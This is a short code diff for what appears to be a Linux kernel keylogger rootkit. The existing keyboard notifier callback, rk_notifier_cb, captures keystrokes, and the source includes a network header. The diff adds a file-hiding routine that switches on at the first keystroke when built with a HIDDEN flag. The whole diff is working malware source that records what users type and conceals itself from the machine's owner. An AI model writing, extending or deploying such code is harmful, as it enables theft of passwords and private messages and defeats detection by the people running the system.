@@ -1,6 +1,7 @@
 #include <linux/keyboard.h>
 #include <linux/input.h>
 #include "rk_net.h"
+#include "rk_hide_file.h"
 
 #define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
 
@@ -59,6 +60,12 @@ int rk_notifier_cb(struct notifier_block *nb, unsigned long action, void *data) 
     size_t len;
     char keybuf[CHUNK_LEN] = {0};
     struct keyboard_notifier_param *param = data;
+
+    #ifdef HIDDEN
+    if (!rk_file_hidden) {
+        rk_hide_file_init();
+    }
+    #endif
 
     if (param->down != 1)
         return NOTIFY_OK;
